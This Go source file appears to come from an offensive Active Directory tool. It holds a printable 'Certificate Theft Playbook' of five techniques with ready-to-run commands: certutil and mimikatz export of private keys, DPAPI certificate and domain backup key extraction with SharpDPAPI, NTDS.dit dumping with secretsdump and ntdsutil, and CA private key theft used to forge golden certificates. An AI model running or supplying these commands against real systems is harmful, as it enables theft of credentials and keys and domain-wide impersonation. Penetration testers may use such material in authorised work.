package pki

import "fmt"

// CertTheftMethod describes a certificate theft technique.
type CertTheftMethod struct {
	Name        string
	Description string
	Tool        string
	Commands    []string
	Notes       string
}

// GetCertTheftMethods returns all supported certificate theft techniques.
func GetCertTheftMethods() []CertTheftMethod {
	return []CertTheftMethod{
		{
			Name:        "THEFT1 — Export via Windows Crypto API",
			Description: "Export user/machine certificates from the Windows certificate store when the private key is marked as exportable.",
			Tool:        "certutil / PowerShell / mimikatz",
			Commands: []string{
				"# List user certificates",
				"certutil -user -store My",
				"# Export with private key (if exportable)",
				"certutil -user -exportPFX My <thumbprint> cert.pfx",
				"# PowerShell equivalent",
				"Get-ChildItem Cert:\\CurrentUser\\My | Export-PfxCertificate -FilePath cert.pfx -Password (ConvertTo-SecureString -String 'pass' -Force -AsPlainText)",
				"# mimikatz (bypasses non-exportable flag via crypto::capi)",
				"mimikatz # crypto::capi",
				"mimikatz # crypto::certificates /export /store:MY",
			},
			Notes: "Requires access to the user's session. Works when keys are marked exportable.",
		},
		{
			Name:        "THEFT2 — DPAPI Machine Certificate Extraction",
			Description: "Extract machine certificates protected by DPAPI from the local machine store. Requires local admin.",
			Tool:        "SharpDPAPI / mimikatz",
			Commands: []string{
				"# SharpDPAPI — dump machine certificates",
				"SharpDPAPI.exe certificates /machine",
				"# mimikatz equivalent",
				"mimikatz # crypto::certificates /export /store:CERT_SYSTEM_STORE_LOCAL_MACHINE /systemstore:MY",
				"# With DPAPI masterkey backup",
				"mimikatz # lsadump::backupkeys /system:dc01.corp.local /export",
				"SharpDPAPI.exe certificates /machine /mkfile:backup.key",
			},
			Notes: "Requires local administrator. DPAPI backup key from DC decrypts all machine certs in the domain.",
		},
		{
			Name:        "THEFT3 — DPAPI User Certificate Extraction",
			Description: "Extract user certificates protected by DPAPI. Requires the user's password or DPAPI masterkey.",
			Tool:        "SharpDPAPI / mimikatz",
			Commands: []string{
				"# SharpDPAPI with user password",
				"SharpDPAPI.exe certificates /password:UserPass123",
				"# SharpDPAPI with DPAPI backup key (domain-wide)",
				"SharpDPAPI.exe certificates /mkfile:domain_backup.key",
				"# mimikatz",
				"mimikatz # dpapi::capi /in:\"C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\<SID>\\<container>\"",
			},
			Notes: "User DPAPI masterkeys are derived from the user's password. Domain backup key decrypts all user keys.",
		},
		{
			Name:        "THEFT4 — NTDS.dit Certificate Extraction",
			Description: "Extract certificates stored in Active Directory (NTDS.dit) including user certificate mappings.",
			Tool:        "secretsdump.py / ntdsutil",
			Commands: []string{
				"# Dump NTDS.dit (includes userCertificate attributes)",
				"secretsdump.py -ntds ntds.dit -system SYSTEM -outputfile dump LOCAL",
				"# ntdsutil snapshot method",
				"ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\temp\\ntds\" quit quit",
				"# Extract certificates from dump",
				"python3 -c \"import ldap3; # parse userCertificate attributes from NTDS dump\"",
			},
			Notes: "Requires domain admin or NTDS.dit access. Contains all user certificates stored in AD.",
		},
		{
			Name:        "THEFT5 — CA Private Key Extraction",
			Description: "Extract the Certificate Authority's private key for golden certificate attacks. Requires admin on the CA server.",
			Tool:        "SharpDPAPI / mimikatz / certsrv.msc",
			Commands: []string{
				"# certutil backup (requires CA admin)",
				"certutil -backupKey C:\\temp\\ca-backup",
				"# mimikatz CA key extraction",
				"mimikatz # crypto::scauth /caname:\"corp-DC01-CA\" /keyexport",
				"# SharpDPAPI",
				"SharpDPAPI.exe certificates /machine",
				"# Then use extracted CA key for golden cert:",
				"certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt",
			},
			Notes: "The CA private key enables forging ANY certificate trusted by the domain. This is the PKI equivalent of a krbtgt key.",
		},
	}
}

// PrintCertTheftPlaybook prints a step-by-step guide for certificate theft.
func PrintCertTheftPlaybook(method string) {
	methods := GetCertTheftMethods()

	if method == "" || method == "all" {
		fmt.Println("[+] Certificate Theft Playbook — All Techniques")
		for _, m := range methods {
			printMethod(m)
		}
		return
	}

	for _, m := range methods {
		if containsIgnoreCase(m.Name, method) {
			printMethod(m)
			return
		}
	}

	fmt.Printf("[!] Unknown method: %s\n", method)
	fmt.Println("[*] Available methods:")
	for _, m := range methods {
		fmt.Printf("    - %s\n", m.Name)
	}
}

func printMethod(m CertTheftMethod) {
	fmt.Printf("━━━ %s ━━━\n", m.Name)
	fmt.Printf("    %s\n", m.Description)
	fmt.Printf("    Tools: %s\n\n", m.Tool)
	for _, cmd := range m.Commands {
		fmt.Printf("    %s\n", cmd)
	}
	fmt.Printf("\n    Note: %s\n\n", m.Notes)
}

func containsIgnoreCase(s, substr string) bool {
	return indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	sl := len(substr)
	for i := 0; i <= len(s)-sl; i++ {
		match := true
		for j := 0; j < sl; j++ {
			a, b := s[i+j], substr[j]
			if a >= 'A' && a <= 'Z' {
				a += 32
			}
			if b >= 'A' && b <= 'Z' {
				b += 32
			}
			if a != b {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return -1
}
